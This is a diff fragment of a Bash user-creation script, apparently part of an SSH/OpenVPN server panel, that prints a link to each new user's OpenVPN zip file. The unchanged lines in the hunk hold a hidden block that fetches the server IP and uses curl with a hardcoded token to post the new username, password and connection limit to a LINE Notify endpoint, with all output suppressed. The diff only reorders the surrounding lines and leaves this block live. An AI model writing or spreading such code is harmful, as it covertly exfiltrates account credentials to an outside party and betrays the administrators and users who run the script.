@@ -372,12 +372,13 @@ echo "$username $sshlimiter" >>/root/usuarios.db
 			[[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]] && {
 				echo -e "\033[1;32mLINK\033[1;37m: \033[1;36m$IP:81/html/openvpn/$username.zip"
 			} || {
-				echo -e "\033[1;32mLINK➪\033[1;37m: \033[1;36m$IP:86/openvpn/$username.zip"
-			}
 #แจ้งเตือนคนรันสคิป
 IP=$(wget -qO- ipv4.icanhazip.com);
 curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
 Test  $IP:86/openvpn/$username.zip U$username P$password L$sshlimiter"'' https://notify-api.line.me/api/notify > /dev/null 2>&1
+				echo -e "\033[1;32mLINK➪\033[1;37m: \033[1;36m$IP:86/openvpn/$username.zip"
+			}
+
 		} || {
 			echo -e "\033[1;32mDisponivel em\033[1;31m" ~/"$username.zip\033[0m"
 			sleep 1
